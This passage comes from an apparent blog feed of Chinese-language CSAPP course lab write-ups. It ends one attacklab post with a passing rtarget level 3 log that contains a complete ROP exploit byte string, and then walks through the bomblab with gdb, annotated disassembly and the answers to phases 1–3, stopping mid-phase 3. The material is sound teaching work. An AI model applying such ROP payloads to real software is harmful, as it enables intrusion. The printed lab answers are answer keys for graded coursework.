touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>美美通关</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CMU 15-213 CSAPP】详解lab2——bomblab</title>
      <link href="/2024/02/10/%E3%80%90CMU%2015-213%20CSAPP%E3%80%91%E8%AF%A6%E8%A7%A3lab2%E2%80%94%E2%80%94bomblab/"/>
      <url>/2024/02/10/%E3%80%90CMU%2015-213%20CSAPP%E3%80%91%E8%AF%A6%E8%A7%A3lab2%E2%80%94%E2%80%94bomblab/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>又是一个刚上手差点放弃的lab，一边看视频一边看书一边找资料，初窥门径知道gdb怎么用和汇编怎么看后就开始自己拆弹了</p><p>参考资料：</p><p>gdb命令：<a href="http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf">Enscript Output (cmu.edu)</a></p><p>windows和linux读取换行符的转换问题：<a href="https://blog.csdn.net/hnxyxiaomeng/article/details/84979649">windows和linux下读取文件换行符的一个坑——\r\n和\n_linux unknown \r\n-CSDN博客</a></p><p>bomblab全攻略：<a href="https://www.bilibili.com/video/BV1vu411o7QP">【深入理解计算机系统 实验2 CSAPP】bomb lab 炸弹实验 CMU bomblab</a></p><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="0-实验热身"><a href="#0-实验热身" class="headerlink" title="0. 实验热身"></a>0. 实验热身</h2><h3 id="0-1-gdb命令"><a href="#0-1-gdb命令" class="headerlink" title="0.1 gdb命令"></a>0.1 gdb命令</h3><p>先圈一下一些重要的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gdb，启动！</span></span><br><span class="line">root@Andrew:/mnt/d/.c/csapp/bomb# gdb bomb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印栈信息</span></span><br><span class="line">(gdb) info stack</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印寄存器的值</span></span><br><span class="line">(gdb) print $rax</span><br><span class="line">(gdb) p $rax</span><br><span class="line">(gdb) p /x $rip # 输出当前指令地址</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反汇编某个函数</span></span><br><span class="line">(gdb) disas funcName</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将输出信息保存到文件中（很好用，方便在文件看汇编</span></span><br><span class="line">(gdb) set logging file fileName</span><br><span class="line">(gdb) set logging on</span><br><span class="line">    # 反汇编某个函数</span><br><span class="line">(gdb) set logging off</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">调试</span></span><br><span class="line">(gdb) break funcName #设置断点</span><br><span class="line">(gdb) run </span><br><span class="line">(gdb) layout asm # 显示汇编代码 ctrl+x+a退出</span><br></pre></td></tr></table></figure><h3 id="0-2-常用寄存器"><a href="#0-2-常用寄存器" class="headerlink" title="0.2 常用寄存器"></a>0.2 常用寄存器</h3><p><img src="/img/2024/02/register1.png" alt="register1.png"><br><img src="/img/2024/02/register2.png" alt="register2.png"></p><p>还有一个$rip保存指令地址</p><h3 id="0-3-保存答案"><a href="#0-3-保存答案" class="headerlink" title="0.3 保存答案"></a>0.3 保存答案</h3><p>bomb.c允许我们传入文件，文件包含已经破解的炸弹的密码，在调试后面的炸弹时就不需要反复输入了：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run ans.txt</span><br></pre></td></tr></table></figure></p><p>注意！！！如果是<strong>在wsl中访问windows</strong>的文件，会出现换行符的转换问题，导致程<strong>序读到的字符串比我们写的多出一个\r</strong>，解决方案如下：</p><p>用vim打开ans.txt<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/bomb# vim ans.txt</span><br></pre></td></tr></table></figure><br>输入以下命令<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:<span class="keyword">set</span> fileformat=unix</span><br><span class="line">:<span class="keyword">wq</span></span><br></pre></td></tr></table></figure><br>之后即可正常使用</p><h2 id="1-phase-1"><a href="#1-phase-1" class="headerlink" title="1. phase_1"></a>1. phase_1</h2><h3 id="1-1-对主函数反汇编"><a href="#1-1-对主函数反汇编" class="headerlink" title="1.1 对主函数反汇编"></a>1.1 对主函数反汇编</h3><p>先将主函数反汇编后保存在main.asm<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) set logging file main.asm</span><br><span class="line">(gdb) set logging on</span><br><span class="line">(gdb) disas main</span><br><span class="line">(gdb) set logging off</span><br></pre></td></tr></table></figure></p><p>找到跟第一个炸弹有关的代码如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; main.asm</span><br><span class="line">   0x0000000000400e2d &lt;+141&gt;:call   0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400e32 &lt;+146&gt;:call   0x40149e &lt;read_line&gt;</span><br><span class="line">   0x0000000000400e37 &lt;+151&gt;:mov    %rax,%rdi</span><br><span class="line">   0x0000000000400e3a &lt;+154&gt;:call   0x400ee0 &lt;phase_1&gt;</span><br></pre></td></tr></table></figure><br>我们知道%rax是存返回值的，%rdi是存第一个参数的，那么上述代码的意思，就是在read_line()中读到用户的输入，然后将这个输入返回，作为phase_1()的参数</p><h3 id="1-2-对phase-1-反汇编"><a href="#1-2-对phase-1-反汇编" class="headerlink" title="1.2 对phase_1()反汇编"></a>1.2 对phase_1()反汇编</h3><p>同理，对phase_1()反汇编，我们对其逐行解析一下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; phase_1.asm</span><br><span class="line">   0x0000000000400ee0 &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:mov    $0x402400,%esi               ; 将常量赋给%esi</span><br><span class="line">   0x0000000000400ee9 &lt;+9&gt;:call   0x401338 &lt;strings_not_equal&gt; ; 调用函数比较两个字符串, 第一个参数是%edi, 第二个参数是%esi</span><br><span class="line">   0x0000000000400eee &lt;+14&gt;:test   %eax,%eax</span><br><span class="line">   0x0000000000400ef0 &lt;+16&gt;:je     0x400ef7 &lt;phase_1+23&gt;     ; 当两个字符串相等时，跳过炸弹爆炸(explode_bomb)</span><br><span class="line">   0x0000000000400ef2 &lt;+18&gt;:call   0x40143a &lt;explode_bomb&gt;         </span><br><span class="line">   0x0000000000400ef7 &lt;+23&gt;:add    $0x8,%rsp</span><br><span class="line">   0x0000000000400efb &lt;+27&gt;:ret    </span><br></pre></td></tr></table></figure><br>从上述分析可知，我们要输入一个字符串跟内存$0x402400处的字符串一样</p><p>那么先看一下这个字符串是什么：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">x/s 0xbffff890 Examine a string stored at 0xbffff890</span></span><br><span class="line">(gdb) x/s 0x402400</span><br><span class="line">0x402400:       &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure><br>因此，密码就是：<strong>Border relations with Canada have never been better.</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/bomb# ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br></pre></td></tr></table></figure><h2 id="2-phase-2"><a href="#2-phase-2" class="headerlink" title="2. phase_2"></a>2. phase_2</h2><h3 id="2-1-分析read-six-numbers"><a href="#2-1-分析read-six-numbers" class="headerlink" title="2.1 分析read_six_numbers()"></a>2.1 分析read_six_numbers()</h3><p>一回生二回熟，对 <strong>phase_2()</strong> 反汇编，然后掐头去尾（忽略callee-saved register的保存复原操作），先看最前面的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">; phase_2.asm</span><br><span class="line">   0x0000000000400efe &lt;+2&gt;:sub    $0x28,%rsp</span><br><span class="line">   0x0000000000400f02 &lt;+6&gt;:mov    %rsp,%rsi</span><br><span class="line">   0x0000000000400f05 &lt;+9&gt;:call   0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000400f0a &lt;+14&gt;:cmpl   $0x1,(%rsp)</span><br><span class="line">   0x0000000000400f0e &lt;+18&gt;:je     0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f10 &lt;+20&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f15 &lt;+25&gt;:jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f17 &lt;+27&gt;:mov    -0x4(%rbx),%eax</span><br><span class="line">   0x0000000000400f1a &lt;+30&gt;:add    %eax,%eax</span><br><span class="line">   0x0000000000400f1c &lt;+32&gt;:cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000400f1e &lt;+34&gt;:je     0x400f25 &lt;phase_2+41&gt;  </span><br><span class="line">   0x0000000000400f20 &lt;+36&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f25 &lt;+41&gt;:add    $0x4,%rbx</span><br><span class="line">   0x0000000000400f29 &lt;+45&gt;:cmp    %rbp,%rbx</span><br><span class="line">   0x0000000000400f2c &lt;+48&gt;:jne    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f2e &lt;+50&gt;:jmp    0x400f3c &lt;phase_2+64&gt;</span><br><span class="line">   0x0000000000400f30 &lt;+52&gt;:lea    0x4(%rsp),%rbx</span><br><span class="line">   0x0000000000400f35 &lt;+57&gt;:lea    0x18(%rsp),%rbp</span><br><span class="line">   0x0000000000400f3a &lt;+62&gt;:jmp    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f3c &lt;+64&gt;:add    $0x28,%rsp</span><br></pre></td></tr></table></figure><p>看起来比phase_1()复杂得多，先看最前面吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; phase_2.asm</span><br><span class="line">   0x0000000000400efe &lt;+2&gt;:sub    $0x28,%rsp</span><br><span class="line">   0x0000000000400f02 &lt;+6&gt;:mov    %rsp,%rsi</span><br><span class="line">   0x0000000000400f05 &lt;+9&gt;:call   0x40145c &lt;read_six_numbers&gt;</span><br></pre></td></tr></table></figure><p>这里为phase_2()申请了一段栈帧，然后调用read_six_numbers，第一个参数$rdi还是我们输入的字符串，<strong>第二个参数%rsi居然是phase_2()栈顶的位置</strong>！</p><p>那read_six_numbers干了什么？有些人能猜出来，我是没猜出来，可以对 <strong>read_six_numbers()</strong> 反汇编继续分析：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">; read_six_numbers.asm</span><br><span class="line">   0x000000000040145c &lt;+0&gt;:sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401460 &lt;+4&gt;:mov    %rsi,%rdx        ; %rsi是phase_2()的栈帧的栈顶，我们记作p, 那么%rdx = p</span><br><span class="line">   0x0000000000401463 &lt;+7&gt;:lea    0x4(%rsi),%rcx   ; %rcx = p + 4</span><br><span class="line">   0x0000000000401467 &lt;+11&gt;:lea    0x14(%rsi),%rax   </span><br><span class="line">   0x000000000040146b &lt;+15&gt;:mov    %rax,0x8(%rsp)   ; 0x8(%rsp) = p + 0x14 = p + 20</span><br><span class="line">   0x0000000000401470 &lt;+20&gt;:lea    0x10(%rsi),%rax</span><br><span class="line">   0x0000000000401474 &lt;+24&gt;:mov    %rax,(%rsp)      ; (%rsp) = p + 0x10 = p + 16</span><br><span class="line">   0x0000000000401478 &lt;+28&gt;:lea    0xc(%rsi),%r9    ; %r9 = p + 0xc = p + 12</span><br><span class="line">   0x000000000040147c &lt;+32&gt;:lea    0x8(%rsi),%r8    ; %r8 = p + 8</span><br><span class="line">   0x0000000000401480 &lt;+36&gt;:mov    $0x4025c3,%esi   ; %esi为地址0x4025c3上的值, x/s 4025c3得&quot;%d %d %d %d %d %d&quot;</span><br><span class="line">   0x0000000000401485 &lt;+41&gt;:mov    $0x0,%eax        ; %eax = 0</span><br><span class="line">   </span><br><span class="line">   ; 重点来了，下面调用了sscanf()，在c语言中，这个函数读取一个字符串，将它格式化到其他参数中</span><br><span class="line">   ; 那么这个函数的参数是哪些？</span><br><span class="line">   ; 显然, 第一个参数 %edi 没改变过, 仍然是我们输入的字符串,</span><br><span class="line">   ; 第二个参数是%esi = &quot;%d %d %d %d %d %d&quot;, 也就是将我们的字符串格式化成六个十进制整型数字</span><br><span class="line">   ; 第三到六个参数依次为 %edx=p, %ecx=p+4, %r8=p+8, %r9=p+12</span><br><span class="line">   ; 从第七个参数开始不使用寄存器, 而是read_six_numbers()的栈帧, 如下:</span><br><span class="line">   ; 第七个参数 (%rsp)=p+16, 第八个参数0x8(%rsp)=p+20</span><br><span class="line">   ;</span><br><span class="line">   ; 总结: 也就是说, sscanf()从我们输入的字符串中读取六个十进制数, 然后存到phase_2()的栈帧中, </span><br><span class="line">   ; 栈顶存的第一个, 每+4位存一个</span><br><span class="line">   0x000000000040148a &lt;+46&gt;:call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"></span><br><span class="line">   0x000000000040148f &lt;+51&gt;:cmp    $0x5,%eax        ; sscanf()的返回值应该是匹配数</span><br><span class="line">   0x0000000000401492 &lt;+54&gt;:jg     0x401499 &lt;read_six_numbers+61&gt;  </span><br><span class="line">   0x0000000000401494 &lt;+56&gt;:call   0x40143a &lt;explode_bomb&gt;   ; 如果没有六个数, 那么炸弹爆炸</span><br><span class="line">   0x0000000000401499 &lt;+61&gt;:add    $0x18,%rsp</span><br><span class="line">   0x000000000040149d &lt;+65&gt;:ret     </span><br></pre></td></tr></table></figure></p><p>省流：read_six_numbers()<strong>从我们输入的字符串中读取六个十进制数, 然后存到phase_2()的栈帧中</strong>, (%rsp)存第一个, 0x4(rsp)存第二个, …, 0x14(rsp)存第六个。</p><h3 id="2-2-分析phase-2-主体"><a href="#2-2-分析phase-2-主体" class="headerlink" title="2.2 分析phase_2()主体"></a>2.2 分析phase_2()主体</h3><p>接下来继续分析read_six_numbers()之后的代码：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400f0a &lt;+14&gt;:cmpl   $0x1,(%rsp)</span><br><span class="line">0x0000000000400f0e &lt;+18&gt;:je     0x400f30 &lt;phase_2+52&gt;  </span><br><span class="line">0x0000000000400f10 &lt;+20&gt;:call   0x40143a &lt;explode_bomb&gt;   ; (%rsp)不为1则引爆炸弹, 说明第一个数是1</span><br><span class="line"></span><br><span class="line">; 以下四段构成了一个循环: </span><br><span class="line">; for(%rbx=0x4(%rsp), %rbp=0x18(%rsp); %rbx != %rbp; %rbx += 4)&#123;</span><br><span class="line">;  %eax = -0x4(rbx);</span><br><span class="line">;  %eax += %eax</span><br><span class="line">;  if (*%rbx != %eax)</span><br><span class="line">;     explode_bomb();</span><br><span class="line">; &#125;</span><br><span class="line">0x0000000000400f15 &lt;+25&gt;:jmp    0x400f30 &lt;phase_2+52&gt;     ; 通过之后跳到phase_2+52</span><br><span class="line"></span><br><span class="line">0x0000000000400f17 &lt;+27&gt;:mov    -0x4(%rbx),%eax           ; %eax = -0x4(%rbx), 是第一个数, 也就是1</span><br><span class="line">0x0000000000400f1a &lt;+30&gt;:add    %eax,%eax                 ; %eax += %eax, 也就是翻倍</span><br><span class="line">0x0000000000400f1c &lt;+32&gt;:cmp    %eax,(%rbx)                </span><br><span class="line">0x0000000000400f1e &lt;+34&gt;:je     0x400f25 &lt;phase_2+41&gt;  </span><br><span class="line">0x0000000000400f20 &lt;+36&gt;:call   0x40143a &lt;explode_bomb&gt;   ; 如果%rbx不等于两倍的-0x4(%rbx), bomb!</span><br><span class="line">0x0000000000400f25 &lt;+41&gt;:add    $0x4,%rbx                 ; %rbx += 0x4</span><br><span class="line"></span><br><span class="line">0x0000000000400f29 &lt;+45&gt;:cmp    %rbp,%rbx                 </span><br><span class="line">0x0000000000400f2c &lt;+48&gt;:jne    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">0x0000000000400f2e &lt;+50&gt;:jmp    0x400f3c &lt;phase_2+64&gt;     ; if(%rbx != %rbp) 跳转到phase_27, 也就是循环, 否则跳转到phase_2+64</span><br><span class="line"></span><br><span class="line">0x0000000000400f30 &lt;+52&gt;:lea    0x4(%rsp),%rbx            ; %rbx = 0x4(%rsp), 是第二个数的地址</span><br><span class="line">0x0000000000400f35 &lt;+57&gt;:lea    0x18(%rsp),%rbp           ; %rbp = 0x18(%rsp), 是第六个数的地址0x14(%rsp)再加4</span><br><span class="line">0x0000000000400f3a &lt;+62&gt;:jmp    0x400f17 &lt;phase_2+27&gt;     ; 初始化%rbx和%rbp后跳转到phase_2+27</span><br><span class="line"></span><br><span class="line">; 总结: 上述循环要求从第二个数开始到第六个数, 每个数都得是前一个数的两倍, </span><br><span class="line">; 也就是要求我们输入: 1 2 4 8 16 32</span><br><span class="line"></span><br><span class="line">0x0000000000400f3c &lt;+64&gt;:add    $0x28,%rsp</span><br><span class="line">0x0000000000400f40 &lt;+68&gt;:pop    %rbx</span><br><span class="line">0x0000000000400f41 &lt;+69&gt;:pop    %rbp</span><br><span class="line">0x0000000000400f42 &lt;+70&gt;:ret    </span><br></pre></td></tr></table></figure></p><p>省流：read_six_numbers()读取了六个数字, 而phase_2()中要求我们<strong>第一个数是1，且从第二个数开始，每个数需要是前一个数的两倍</strong>，故密码为：<strong>1 2 4 8 16 32</strong><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/bomb# ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br></pre></td></tr></table></figure></p><h2 id="3-phase-3"><a href="#3-phase-3" class="headerlink" title="3. phase_3"></a>3. phase_3</h2><p>对phase_3()反汇编，先看最前面：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400f43 &lt;+0&gt;:sub    $0x18,%rsp</span><br><span class="line">0x0000000000400f47 &lt;+4&gt;:lea    0xc(%rsp),%rcx   ; 第四个参数是0xc(%rsp)</span><br><span class="line">0x0000000000400f4c &lt;+9&gt;:lea    0x8(%rsp),%rdx   ; 第三个参数是0x8(%rsp)</span><br><span class="line">0x0000000000400f51 &lt;+14&gt;:mov    $0x4025cf,%esi   ; 第二个参数是地址0x4025cf的值, x/s 0x4025cf得&quot;%d %d&quot;</span><br><span class="line">0x0000000000400f56 &lt;+19&gt;:mov    $0x0,%eax</span><br><span class="line">0x0000000000400f5b &lt;+24&gt;:call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;  ; 太熟悉了家人们</span><br><span class="line"></span><br><span class="line">0x0000000000400f60 &lt;+29&gt;:cmp    $0x1,%eax</span><br><span class="line">0x0000000000400f63 &lt;+32&gt;:jg     0x400f6a &lt;phase_3+39&gt;</span><br><span class="line">0x0000000000400f65 &lt;+34&gt;:call   0x40143a &lt;explode_bomb&gt;   ; 没有读到两个数- &gt; bomb!</span><br></pre></td></tr></table></figure><br>省流：从我们输入的字符串中读取两个十进制数，<strong>第一个存储在0x8(%rsp)</strong>，<strong>第二个存储在0xc(%rsp)</strong></p><p>再往下面看：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400f6a &lt;+39&gt;:cmpl   $0x7,0x8(%rsp)         </span><br><span class="line">0x0000000000400f6f &lt;+44&gt;:ja     0x400fad &lt;phase_3+106&gt;    ; 第一个数比7大就跳到phase_3+106 -&gt; bomb!</span><br><span class="line">0x0000000000400f71 &lt;+46&gt;:mov    0x8(%rsp),%eax      </span><br><span class="line">0x0000000000400f75 &lt;+50&gt;:jmp    *0x402470(,%rax,8)  ; 根据第一个数的值跳转到某个位置 相当于switch</span><br></pre></td></tr></table></figure><br>打印每个跳转地址：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p /x *(0x402470)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0x400f7c</span></span><br><span class="line">(gdb) p /x *(0x402470+1*8)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = 0x400fb9</span></span><br><span class="line">(gdb) p /x *(0x402470+2*8)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4 = 0x400f83</span></span><br><span class="line">(gdb) p /x *(0x402470+3*8)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">5 = 0x400f8a</span></span><br><span class="line">(gdb) p /x *(0x402470+4*8)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6 = 0x400f91</span></span><br><span class="line">(gdb) p /x *(0x402470+5*8)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">7 = 0x400f98</span></span><br><span class="line">(gdb) p /x *(0x402470+6*8)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">8 = 0x400f9f</span></span><br><span class="line">(gdb) p /x *(0x402470+7*8)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">9 = 0x400fa6</span></span><br></pre></td></tr></table></figure></p><p>将这些地址对应到语句中，如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400f7c &lt;+57&gt;:mov    $0xcf,%eax          ; 0x8(%rsp) = 0</span><br><span class="line">0x0000000000400f81 &lt;+62&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400f83 &lt;+64&gt;:mov    $0x2c3,%eax         ; 0x8(%rsp) = 2</span><br><span class="line">0x0000000000400f88 &lt;+69&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400f8a &lt;+71&gt;:mov    $0x100,%eax         ; 0x8(%rsp) = 3</span><br><span class="line">0x0000000000400f8f &lt;+76&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400f91 &lt;+78&gt;:mov    $0x185,%eax         ; 0x8(%rsp) = 4</span><br><span class="line">0x0000000000400f96 &lt;+83&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400f98 &lt;+85&gt;:mov    $0xce,%eax          ; 0x8(%rsp) = 5</span><br><span class="line">0x0000000000400f9d &lt;+90&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400f9f &lt;+92&gt;:mov    $0x2aa,%eax         ; 0x8(%rsp) = 6</span><br><span class="line">0x0000000000400fa4 &lt;+97&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400fa6 &lt;+99&gt;:mov    $0x147,%eax         ; 0x8(%rsp) = 7</span><br><span class="line">0x0000000000400fab &lt;+104&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line"></span><br><span class="line">0x0000000000400fad &lt;+106&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000400fb2 &lt;+111&gt;:mov    $0x0,%eax</span><br><span class="line">0x0000000000400fb7 &lt;+116&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400fb9 &lt;+118&gt;:mov    